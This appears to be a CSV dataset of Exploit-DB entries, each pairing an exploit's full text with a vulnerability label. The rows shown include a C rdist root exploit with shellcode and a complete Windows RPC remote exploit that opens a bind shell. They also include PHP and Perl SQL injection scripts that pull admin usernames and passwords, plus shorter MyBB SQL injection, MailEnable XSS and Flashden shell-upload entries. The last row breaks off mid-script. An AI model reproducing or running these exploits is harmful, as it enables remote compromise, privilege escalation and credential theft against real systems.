27236,"MyBB 1.0.3 - 'private.php' Multiple SQL Injections source: https://www.securityfocus.com/bid/16678/info  MyBB is prone to multiple SQL-injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.   Successful exploitation can allow an attacker to bypass authentication and gain administrative access to a site, modify data, or exploit vulnerabilities in the underlying database implementation. Other attacks may also be possible.    MyBB version 1.0.3 is reported to be vulnerable.  http://www.example.com/mybb/private.php?action=do_folders&folder['<strong>sql</strong>]=nomatter http://www.example.com/mybb/private.php?action=do_folders&folder['<strong>sql</strong>] http://www.example.com/mybb/private.php?action=do_stuff&delete=1&check['<strong>sql</strong>]",SQL-injection,1
18447,"MailEnable Webmail - Cross-Site Scripting ME020567: MailEnable webmail cross-site scripting vulnerability (CWE-79) References: CVE-2012-0389 Discovered by: Sajjad Pourali, Narendra Shinde and Shahab NamaziKhah Vendor advisory: http://www.mailenable.com/kb/Content/Article.asp?ID=me020567 Vendor contact: 2012-01-04 09:49:36 UTC Vendor response: 2012-01-04 10:27:13 UTC (Peter Fregon from MailEnable) Vendor fix and announcement: 2012-01-10 00:50:31 UTC  Vulnerability description:  MailEnable <http://www.mailenable.com/> Professional and Enterprise versions are prone to cross-site scripting vulnerabilities as the user-supplied input received via ""Username"" parameter of ""ForgottonPassword.aspx"" page is not properly sanitized. A specially crafted URL which a user clicks could gain access to the users cookies for webmail or execute other malicious code in users browser in context of the domain in use.  Remote: yes Authentication required: no User interaction required: yes  Affected:  - MailEnable Professional, Enterprise & Premium 4.26 and earlier - MailEnable Professional, Enterprise & Premium 5.52 and earlier - MailEnable Professional, Enterprise & Premium 6.02 and earlier  Not affected:  - MailEnable Standard is not affected.  PoC:  http://server/mewebmail/Mondo/lang/sys/ForgottenPassword.aspx?Username='};alert(/XSS/);{'  Resolution:  Users of MailEnable 5 and 6 can resolve the issue by upgrading to version 5.53 or 6.03 or later. Alternatively, and for version 4 users, the following fix can be applied:  1) Open the ForgottenPassword.aspx file in Notepad. This file is in the Mail Enable\bin\NETWebMail\Mondo\lang\[language] folders in version 4 and in Mail Enable\bin\NETWebMail\Mondo\lang\sys in version 5 and 6. 2) Locate and remove the following line, then save the file: document.getElementById(""txtUsername"").value = '<%= Request.Item(""Username"") %>';",Cross-Site Scripting,1
19106,"BSDI BSD/OS 2.1 / FreeBSD 2.1 / IBM AIX 4.2 / SGI IRIX 6.4 / Sun SunOS 4.1.3 - Buffer Overrun /* source: https://www.securityfocus.com/bid/129/info  Rdist is a program to maintain identical copies of files over multiple hosts. It preserves the owner, group, mode, and mtime of files if possible and can update programs that are executing. Rdist reads commands from distfile to direct the updating of files and/or directories.  Rdist has over time been notorious for security vulnerabilities. In this instance it is vulnerable to a buffer overrun from user supplied data. Given that rdist is setuid root in some enviroments the attacker can excecute this buffer overflow with the resulting commands they craft being executed as root. */  /* cut here Brian Mitchell (brian@saturn.net) */ #include <stdio.h> #include <stdlib.h> #include <unistd.h>  #define DEFAULT_OFFSET 50 #define BUFFER_SIZE 256  long get_esp(void) { __asm__(""movl %esp,%eax\n""); }  main(int argc, char **argv) { char *buff = NULL; unsigned long *addr_ptr = NULL; char *ptr = NULL;  /* so you dont have to disassemble it, here is the asm code: start: jmp endofk0dez realstart: popl %esi leal (%esi), %ebx movl %ebx, 0x0b(%esi) xorl %edx, %edx movl %edx, 7(%esi) movl %edx, 0x0f(%esi) movl %edx, 0x14(%esi) movb %edx, 0x19(%esi) xorl %eax, %eax movb $59, %al leal 0x0b(%esi), %ecx movl %ecx, %edx pushl %edx pushl %ecx pushl %ebx pushl %eax jmp bewm endofk0dez: call realstart .byte '/', 'b', 'i', 'n', '/', 's', 'h' .byte 1, 1, 1, 1 .byte 2, 2, 2, 2 .byte 3, 3, 3, 3 bewm: .byte 0x9a, 4, 4, 4, 4, 7, 4 */  char execshell[] = ""\xeb\x23"" ""\x5e"" ""\x8d\x1e"" ""\x89\x5e\x0b"" ""\x31\xd2"" ""\x89\x56\x07"" ""\x89\x56\x0f"" ""\x89\x56\x14"" ""\x88\x56\x19"" ""\x31\xc0"" ""\xb0\x3b"" ""\x8d\x4e\x0b"" ""\x89\xca"" ""\x52"" ""\x51"" ""\x53"" ""\x50"" ""\xeb\x18"" ""\xe8\xd8\xff\xff\xff"" ""/bin/sh"" ""\x01\x01\x01\x01"" ""\x02\x02\x02\x02"" ""\x03\x03\x03\x03"" ""\x9a\x04\x04\x04\x04\x07\x04"";  int i; int ofs = DEFAULT_OFFSET;  /* if we have a argument, use it as offset, else use default */ if(argc == 2) ofs = atoi(argv[1]); /* print the offset in use */ printf(""Using offset of esp + %d (%x)\n"", ofs, get_esp()+ofs);  buff = malloc(4096); if(!buff) { printf(""can't allocate memory\n""); exit(0); } ptr = buff; /* fill start of buffer with nops */ memset(ptr, 0x90, BUFFER_SIZE-strlen(execshell)); ptr += BUFFER_SIZE-strlen(execshell); /* stick asm code into the buffer */ for(i=0;i < strlen(execshell);i++) *(ptr++) = execshell[i]; /* write the return addresses ** ** return address 4 ** ebp 4 ** register unsigned n 0 ** register char *cp 0 ** register struct syment *s 0 ** ** total: 8 */ addr_ptr = (long *)ptr; for(i=0;i < (8/4);i++) *(addr_ptr++) = get_esp() + ofs; ptr = (char *)addr_ptr; *ptr = 0; execl(""/usr/bin/rdist"", ""rdist"", ""-d"", buff, ""-d"", buff, NULL); } /* cut here */",buffer overflow,1
117,"Microsoft Windows XP/2000 - RPC Remote Non Exec Memory /*  * have you recently bought one of those expensive new windows security products  * on the market? do you think you now have strong protection?  * Look again:  *  * *rpc!exec*   * by ins1der (trixterjack yahoo com)  *  * windows remote return into libc exploit!  *  * remote rpc exploit breaking non exec memory protection schemes  * tested against :   *		OverflowGuard   *		StackDefender (kernel32 imagebase randomization:O nice try guys.)  *		 	  *  * currently breaking:  * Windows 2000 SP0 (english)  * Windows XP SP0 (english)  *  * to get new offsets use this:  * ------------------------------  * 	#include <windows.h>  *	#include <stdio.h>  *	  *	int main()  *	{  *	HANDLE h1,h2;  *	unsigned long addr1,addr2,addr3,addr4;  *	h1=LoadLibrary(""ntdll.dll"");  *	h2=LoadLibrary(""MSVCRT.dll"");  *	addr1=(unsigned long)GetProcAddress(h1,""NtAllocateVirtualMemory"");  *	addr2=(unsigned long)GetProcAddress(h2,""memcpy"");  *	addr3=(unsigned long)GetProcAddress(h1,""NtProtectVirtualMemory"");  *		for (addr4=addr1;addr4<addr1+0xffff;addr4++)  *			{  *			if (!memcmp((void*)addr4,""\xc9\xc3"",2)) break;  *			}  *	printf(""0x%x 0x%x 0x%x 0x%x\n"",addr1,addr2,addr3,addr4);  *	return 0;  *	}  * -----------------------------  * to get the last offset use a standard rpc dcom exploit with the last  * \x90\x90 before the shellcode replaced with \xcd\x21. run the exploit  * and read the drwatson logs. substract 0xA5 from the fault address.  *  *  * 	Shouts go to:   *		w00pz, SpaceCow, Int3, lacroix, misu200, j00(xor),  *		s0ny, crisis, and to all my true friends.  *	  *	  * 	Enjoy!  *   */  #include <sys/socket.h> #include <netinet/in.h>  unsigned char bindstr[]={ 0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x7F,0x00,0x00,0x00, 0xD0,0x16,0xD0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00, 0xa0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46, 0x00,0x00,0x00,0x00,0x04,0x5D,0x88,0x8A,0xEB,0x1C,0xC9,0x11,0x9F,0xE8,0x08,0x00, 0x2B,0x10,0x48,0x60,0x02,0x00,0x00,0x00};  unsigned char request1[]={ 0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,0xE8,0x03,0x00,0x00,0xE5,0x00,0x00,0x00, 0xD0,0x03,0x00,0x00,0x01,0x00,0x04,0x00,0x05,0x00,0x06,0x00,0x01,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x32,0x24,0x58,0xFD,0xCC,0x45,0x64,0x49,0xB0,0x70,0xDD,0xAE, 0x74,0x2C,0x96,0xD2,0x60,0x5E,0x0D,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x70,0x5E,0x0D,0x00,0x02,0x00,0x00,0x00,0x7C,0x5E,0x0D,0x00,0x00,0x00,0x00,0x00, 0x10,0x00,0x00,0x00,0x80,0x96,0xF1,0xF1,0x2A,0x4D,0xCE,0x11,0xA6,0x6A,0x00,0x20, 0xAF,0x6E,0x72,0xF4,0x0C,0x00,0x00,0x00,0x4D,0x41,0x52,0x42,0x01,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00,0x00,0x00,0xA8,0xF4,0x0B,0x00, 0x60,0x03,0x00,0x00,0x60,0x03,0x00,0x00,0x4D,0x45,0x4F,0x57,0x04,0x00,0x00,0x00, 0xA2,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46, 0x38,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46, 0x00,0x00,0x00,0x00,0x30,0x03,0x00,0x00,0x28,0x03,0x00,0x00,0x00,0x00,0x00,0x00, 0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0xC8,0x00,0x00,0x00,0x4D,0x45,0x4F,0x57, 0x28,0x03,0x00,0x00,0xD8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00, 0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0xC4,0x28,0xCD,0x00,0x64,0x29,0xCD,0x00,0x00,0x00,0x00,0x00, 0x07,0x00,0x00,0x00,0xB9,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00, 0x00,0x00,0x00,0x46,0xAB,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00, 0x00,0x00,0x00,0x46,0xA5,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00, 0x00,0x00,0x00,0x46,0xA6,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00, 0x00,0x00,0x00,0x46,0xA4,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00, 0x00,0x00,0x00,0x46,0xAD,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00, 0x00,0x00,0x00,0x46,0xAA,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00, 0x00,0x00,0x00,0x46,0x07,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x58,0x00,0x00,0x00, 0x90,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x78,0x00,0x00,0x00, 0x30,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC, 0x50,0x00,0x00,0x00,0x4F,0xB6,0x88,0x20,0xFF,0xFF,0xFF,0xFF,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC, 0x48,0x00,0x00,0x00,0x07,0x00,0x66,0x00,0x06,0x09,0x02,0x00,0x00,0x00,0x00,0x00, 0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x78,0x19,0x0C,0x00, 0x58,0x00,0x00,0x00,0x05,0x00,0x06,0x00,0x01,0x00,0x00,0x00,0x70,0xD8,0x98,0x93, 0x98,0x4F,0xD2,0x11,0xA9,0x3D,0xBE,0x57,0xB2,0x00,0x00,0x00,0x32,0x00,0x31,0x00, 0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x80,0x00,0x00,0x00,0x0D,0xF0,0xAD,0xBA, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x18,0x43,0x14,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x60,0x00,0x00,0x00, 0x4D,0x45,0x4F,0x57,0x04,0x00,0x00,0x00,0xC0,0x01,0x00,0x00,0x00,0x00,0x00,0x00, 0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x3B,0x03,0x00,0x00,0x00,0x00,0x00,0x00, 0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x30,0x00,0x00,0x00, 0x01,0x00,0x01,0x00,0x81,0xC5,0x17,0x03,0x80,0x0E,0xE9,0x4A,0x99,0x99,0xF1,0x8A, 0x50,0x6F,0x7A,0x85,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00, 0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x30,0x00,0x00,0x00,0x78,0x00,0x6E,0x00, 0x00,0x00,0x00,0x00,0xD8,0xDA,0x0D,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x20,0x2F,0x0C,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x46,0x00,0x58,0x00,0x00,0x00,0x00,0x00, 0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x10,0x00,0x00,0x00,0x30,0x00,0x2E,0x00, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x68,0x00,0x00,0x00,0x0E,0x00,0xFF,0xFF, 0x68,0x8B,0x0B,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};  unsigned char request2[]={ 0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x5C,0x00,0x5C,0x00 };  unsigned char request3[]={ 0x5C,0x00,0x43,0x00,0x24,0x00,0x5C,0x00,0x31,0x00,0x32,0x00,0x33,0x00,0x34,0x00, 0x35,0x00,0x36,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00, 0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00, 0x31,0x00,0x2E,0x00,0x64,0x00,0x6F,0x00,0x63,0x00,0x00,0x00};  unsigned char request4[]={ 0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x20,0x00,0x00,0x00,0x30,0x00,0x2D,0x00, 0x00,0x00,0x00,0x00,0x88,0x2A,0x0C,0x00,0x02,0x00,0x00,0x00,0x01,0x00,0x00,0x00, 0x28,0x8C,0x0C,0x00,0x01,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };   struct offset { char *description; unsigned long valloc; unsigned long amemcpy; unsigned long vprot; unsigned long ret; unsigned long frame; }; struct offset targets[]= { 	{""Windows 2000 SP0 (english)"", 		0x77f95da9, 	    	0x78001194, 		0x77f82ffb, 		0x77f96800, 		0x52f770 	} 	, 	{""Windows XP   SP0 (english)"", 	        0x77f7e4c3, 	        0x77c42e10, 	        0x77f7ec43, 	        0x77f80a07, 	        0x5bf79c 	} 	, 	{NULL,0,0,0,0,0} };   unsigned char shell[]=      	 	""\x46\x00\x58\x00"" 	""\x4E\x00\x42\x00"" 	""\x46\x00\x58\x00"" 	""\x46\x00\x58\x00"" 	 	""\x4E\x00\x42\x00\x46\x00\x58\x00\x46\x00\x58\x00\x46\x00\x58\x00""  	""\xff\xff\xff\xff""   	""\xff\xff\xff\xff""       	""\xcc\xe0\xfd\x7f""     	""\xcc\xe0\xfd\x7f""      	""\x90\x90\x90\x90"" 	""\x90\x90\x90\x90"" 	""\x90\x90\x90\x90"" 	""\x90\x90\x90\x90""     	""\x90\x90\x90\x90"" 	""\x90\x90\x90\x90"" 	""\x90\x90\x90\x90"" 	""\x90\x90\x90\x90"" 	""\x90\x90\x90\x90""  	""\x90\x90\x90\x90""     	""\x90\x90\x90\x90"" 	""\x90\x90\x90\x90"" 	""\x90\x90\x90\x90"" 	""\x90\x90\x90\x90""     	""\x90\x90\x90\x90"" 	 	""\x90\x90\x90\x90"" 	""\x90\x90\x90\x90"" 	""\x90\x90\x90\x90""     	""\x90\x90\x90\x90"" 	""\x90\x90\x90\x90"" 	""\x90\x90\x90\x90"" 	""\x90\x90\x90\x90"" 	""\x90\x90\x90\x90""      	     ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""     ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""     ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""     ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""     ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""          ""\x83\xec\x34\x8b\xf4\xe8\x47\x01\x00\x00\x89\x06\xff\x36\x68\x8e""     ""\x4e\x0e\xec\xe8\x61\x01\x00\x00\x89\x46\x08\xff\x36\x68\xad\xd9""     ""\x05\xce\xe8\x52\x01\x00\x00\x89\x46\x0c\x68\x6c\x6c\x00\x00\x68""     ""\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\x56\x08\x89\x46\x04""     ""\xff\x36\x68\x72\xfe\xb3\x16\xe8\x2d\x01\x00\x00\x89\x46\x10\xff""     ""\x36\x68\xef\xce\xe0\x60\xe8\x1e\x01\x00\x00\x89\x46\x14\xff\x76""     ""\x04\x68\xcb\xed\xfc\x3b\xe8\x0e\x01\x00\x00\x89\x46\x18\xff\x76""     ""\x04\x68\xd9\x09\xf5\xad\xe8\xfe\x00\x00\x00\x89\x46\x1c\xff\x76""     ""\x04\x68\xa4\x1a\x70\xc7\xe8\xee\x00\x00\x00\x89\x46\x20\xff\x76""     ""\x04\x68\xa4\xad\x2e\xe9\xe8\xde\x00\x00\x00\x89\x46\x24\xff\x76""     ""\x04\x68\xe5\x49\x86\x49\xe8\xce\x00\x00\x00\x89\x46\x28\xff\x76""     ""\x04\x68\xe7\x79\xc6\x79\xe8\xbe\x00\x00\x00\x89\x46\x2c\x33\xff""     ""\x81\xec\x90\x01\x00\x00\x54\x68\x01\x01\x00\x00\xff\x56\x18\x50""     ""\x50\x50\x50\x40\x50\x40\x50\xff\x56\x1c\x8b\xd8\x57\x57\x68\x02""     ""\x00\x1c\x07\x8b\xcc\x6a\x16\x51\x53\xff\x56\x20\x57\x53\xff\x56""     ""\x24\x57\x51\x53\xff\x56\x28\x8b\xd0\x68\x65\x78\x65\x00\x68\x63""     ""\x6d\x64\x2e\x89\x66\x30\x83\xec\x54\x8d\x3c\x24\x33\xc0\x33\xc9""     ""\x83\xc1\x15\xab\xe2\xfd\xc6\x44\x24\x10\x44\xfe\x44\x24\x3d\x89""     ""\x54\x24\x48\x89\x54\x24\x4c\x89\x54\x24\x50\x8d\x44\x24\x10\x54""     ""\x50\x51\x51\x51\x6a\x01\x51\x51\xff\x76\x30\x51\xff\x56\x10\x8b""     ""\xcc\x6a\xff\xff\x31\xff\x56\x0c\x8b\xc8\x57\xff\x56\x2c\xff\x56""     ""\x14\x55\x56\x64\xa1\x30\x00\x00\x00\x85\xc0\x78\x0c\x8b\x40\x0c""     ""\x8b\x70\x1c\xad\x8b\x68\x08\xeb\x09\x8b\x40\x34\x8b\xa8\xb8\x00""     ""\x00\x00\x8b\xc5\x5e\x5d\xc2\x04\x00\x53\x55\x56\x57\x8b\x6c\x24""     ""\x18\x8b\x45\x3c\x8b\x54\x05\x78\x03\xd5\x8b\x4a\x18\x8b\x5a\x20""     ""\x03\xdd\xe3\x32\x49\x8b\x34\x8b\x03\xf5\x33\xff\xfc\x33\xc0\xac""     ""\x3a\xc4\x74\x07\xc1\xcf\x0d\x03\xf8\xeb\xf2\x3b\x7c\x24\x14\x75""     ""\xe1\x8b\x5a\x24\x03\xdd\x66\x8b\x0c\x4b\x8b\x5a\x1c\x03\xdd\x8b""     ""\x04\x8b\x03\xc5\xeb\x02\x33\xc0\x8b\xd5\x5f\x5e\x5d\x5b\xc2\x04""     ""\x00\x90\x90\x90\x80\xbf\x32\x94\x80\xbf\x32\x94"";    struct frame1 { unsigned long frame0; unsigned long ret; }fr1;  struct retstruct { unsigned long frame1; unsigned long valloc; unsigned long ret1; unsigned long dummy1; unsigned long pointer11; unsigned long zero; unsigned long pointer12; unsigned long type; unsigned long prot;  unsigned long frame2; unsigned long amemcpy; unsigned long ret2; unsigned long dest; unsigned long src; unsigned long size2;  unsigned long frame3; unsigned long vprot; unsigned long ret3; unsigned long dummy2; unsigned long pointer21; unsigned long pointer22; unsigned long newprot; unsigned long oldprot; }rets;  void prepare_ret(int id) {   rets.type=0x3000;   rets.prot=0x4;   rets.newprot=0x20;    rets.valloc=targets[id].valloc;   rets.amemcpy=targets[id].amemcpy;   rets.vprot=targets[id].vprot;   fr1.ret=rets.ret1=rets.ret2=targets[id].ret;   fr1.frame0=targets[id].frame;    rets.frame1=fr1.frame0+9*4;   rets.frame2=rets.frame1+6*4;   rets.oldprot=fr1.frame0;   rets.frame3=rets.frame1;   rets.size2=sizeof(shell);    rets.src=fr1.frame0;   rets.dest=0x55555000;   rets.ret3=0x5555506c;    rets.dummy1=rets.dummy2=0xffffffff;   rets.zero=0;    *(int*)(shell+148)=0x55555000;   *(int*)(shell+152)=sizeof(shell);    *(int*)(shell+140)=0x55555000;   *(int*)(shell+144)=sizeof(shell);    rets.pointer11=fr1.frame0+92;   rets.pointer12=fr1.frame0+96;   rets.pointer21=fr1.frame0+100;   rets.pointer22=fr1.frame0+104;    memcpy(shell+32,&fr1,sizeof(fr1));   memcpy(shell+48,&rets,sizeof(rets)); }  void entershell(int sock) {   char buf[3000];   fd_set  fdr;   int rs;    FD_ZERO(&fdr);   FD_SET(sock,&fdr);   FD_SET(0,&fdr);    for(;;)    {     FD_SET(sock, &fdr);     FD_SET(0, &fdr);     if(select(FD_SETSIZE,&fdr,NULL,NULL,NULL)<0) break;     if(FD_ISSET(sock, &fdr))        {         if((rs=read(sock,buf,sizeof(buf)))<0)         {            printf(""connection lost\n"");            return;         }         if(write(1,buf,rs)<0) break;       }      if(FD_ISSET(0,&fdr))        {         if((rs=read(0,buf,sizeof(buf)))<0)         {            printf(""[-] Connection lost..\n"");            exit(1);         }         if (write(sock,buf,rs) < 0) break;       }         usleep(100);    }             printf(""connection closed\n"");      return; }   int main(int argc, char **argv) {          int sock,i,len1;     struct sockaddr_in sin;     unsigned char buf1[0x1000],buf2[0x1000];      if(argc<3)     {    	printf(""###############################\n""); 	printf(""return into libc rpc exploit\n""); 	printf(""ins1der 2003\n""); 	printf(""*****************************************\n"");         printf(""usage: %s <ip> <id>\n"", argv[0]); 	printf(""*****************************************\n"");         printf(""targets:\n""); 	printf(""-----------------------------------------\n"");         for (i=0;targets[i].description!= NULL;i++)             {             printf(""%d\t%s\n"",i,targets[i].description);                } 	printf(""-----------------------------------------\n"");                  return 0;     } 	 		  	      printf(""Exploiting %s...\n"",argv[1]);   	     prepare_ret(atoi(argv[2]));          sin.sin_family=AF_INET;     sin.sin_addr.s_addr=inet_addr(argv[1]);     sin.sin_port=htons(135);      if ((sock=socket(AF_INET,SOCK_STREAM,0))==-1)     {         perror(""socket "");         return 0;     }          if(connect(sock,(struct sockaddr*)&sin, sizeof(sin)))     {         perror(""connect "");         return 0;     }          memcpy(buf2,request1,sizeof(request1));     len1=sizeof(request1);          *(unsigned long *)(request2)=*(unsigned long *)(request2)+sizeof(shell)/2;       *(unsigned long *)(request2+8)=*(unsigned long *)(request2+8)+sizeof(shell)/2;          memcpy(buf2+len1,request2,sizeof(request2));     len1=len1+sizeof(request2);     memcpy(buf2+len1,shell,sizeof(shell));     len1=len1+sizeof(shell);     memcpy(buf2+len1,request3,sizeof(request3));     len1=len1+sizeof(request3);     memcpy(buf2+len1,request4,sizeof(request4));     len1=len1+sizeof(request4);          *(unsigned long *)(buf2+8)=*(unsigned long *)(buf2+8)+sizeof(shell)-0xc;     *(unsigned long *)(buf2+0x10)=*(unsigned long *)(buf2+0x10)+sizeof(shell)-0xc;       *(unsigned long *)(buf2+0x80)=*(unsigned long *)(buf2+0x80)+sizeof(shell)-0xc;     *(unsigned long *)(buf2+0x84)=*(unsigned long *)(buf2+0x84)+sizeof(shell)-0xc;     *(unsigned long *)(buf2+0xb4)=*(unsigned long *)(buf2+0xb4)+sizeof(shell)-0xc;     *(unsigned long *)(buf2+0xb8)=*(unsigned long *)(buf2+0xb8)+sizeof(shell)-0xc;     *(unsigned long *)(buf2+0xd0)=*(unsigned long *)(buf2+0xd0)+sizeof(shell)-0xc;     *(unsigned long *)(buf2+0x18c)=*(unsigned long *)(buf2+0x18c)+sizeof(shell)-0xc;          if (send(sock,(char*)bindstr,sizeof(bindstr),0)==-1)     {             perror(""send"");             return 0;     }      recv(sock,(char*)buf1,1000,0);          if (send(sock,(char*)buf2,len1,0)== -1)     {             perror(""send"");             return 0;     }     close(sock);      sleep(1);          sin.sin_port = htons(7175);      if ((sock=socket(AF_INET,SOCK_STREAM,0)) == -1)     {         perror(""socket"");         return(0);     }          if(connect(sock,(struct sockaddr *)&sin, sizeof(struct sockaddr)) == -1)     {         printf(""Exploit failed\n"");         return(0);     }             printf(""Entering shell\n"");     entershell(sock);     return 1;  }   // milw0rm.com [2003-11-07]",RPC Remote Non Exec Memory,1
7867,"ITLPoll 2.7 Stable2 - Blind SQL Injection <?php  function usage () {     echo ""\nITLPoll v2.7 Stable2 Blind SQL Injection Exploit"".          ""\n[â˜¢] Usage   : ./itlpoll.php hostname path <username or password>"".          ""\n[â˜¢] Ex	: ./itlpoll.php localhost /itlpoll password"". 	 ""\n\n"";     exit (); }   function query ($func, $chr, $pos) {   //replace 1' with a valid poll number if you have problems. See hostname/path/?Archive for a list of polls.     $query = ""1' AND ORD(MID((SELECT IFNULL(CAST({$func} AS CHAR(10000)), CHAR(32)) FROM itl_config WHERE id = 1),{$pos},1))='{$chr}"";     $query = str_replace ("" "", ""%20"", $query);     $query = str_replace (""'"", ""%27"", $query);     return $query; }  function exploit ($host, $path, $func, $pos, $chr) {     $chr = ord ($chr);     $fp = fsockopen ($host, 80);     $query = query ($func, $chr, $pos);     $request = ""GET {$path}/index.php?id={$query} HTTP/1.1\r\n"".            ""Host: {$host}\r\n"".            ""Connection: Close\r\n\r\n"";          fputs ($fp, $request);     while (!feof ($fp))         $reply .= fgets ($fp, 1024);          fclose ($fp);      if (preg_match (""/EXPIERED/"", $reply))         return false;     else         return true; }   if ($argc != 4)      usage ();  $host = $argv [1]; $path = $argv [2]; $func = $argv [3]; $key = ""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789""; //add a bigger char set if you can't get the username $pos = 1; $chr = 0;  echo ""[â˜¢] Creds: "";  while ($pos <= 32) {     if (exploit ($host, $path, $func, $pos, $key [$chr]))     {         echo $key [$chr];         $chr = 0;         $pos++;     }     else         $chr++; } echo ""\n""; ?>  # milw0rm.com [2009-01-26]",Blind SQL Injection,1
10236,"Flashden - Multiple Arbitrary File Uploads # Exploit Title: Flashden Shell Upload Vulnerability  # Date: 26.12.2009  # Author: DigitALL  # Greetz: Zombie KroNickq HackSpy and ALL 1923Turk.Biz Members  # Vendor: http://www.jurgenvisser.nl  # Version: 2.0  # Dork: inurl:""select_file2.php""  # Application: Please Add Files ( Your Shell ) And Upload.  # Shell: /test/shell.php --  /up/shell.php --  /upload/shell.php --  /beta/shell.php OR one back dir.",Arbitrary File Uploads,1
4135,"phpEventCalendar 0.2.3 - 'eventdisplay.php' SQL Injection #!/usr/bin/perl # #	Vendor url: www.ikemcg.com # require LWP::UserAgent;  print ""# # phpEventCalendar <= v0.2.3 SQL Injection Exploit # By Iron - ironwarez.info # Thanks to Silentz for the help :) # Greets to everyone at RootShell Security Group & dHack # # Example target url: http://www.target.com/phpeventcalendar/ Target url?""; chomp($target=<stdin>); if($target !~ /^http:\/\//) { 	$target = ""http://"".$target; } if($target !~ /\/$/) { 	$target .= ""/""; } print ""User id to retrieve name/password from? (1 = admin)""; chomp($target_id=<stdin>); $target .= ""eventdisplay.php?id=-999%20UNION%20SELECT%20username,password,password%20FROM%20pec_users%20WHERE%20uid="".$target_id;  $ua = LWP::UserAgent->new; $ua->timeout(10); $ua->env_proxy;  $response = $ua->get($target);  if 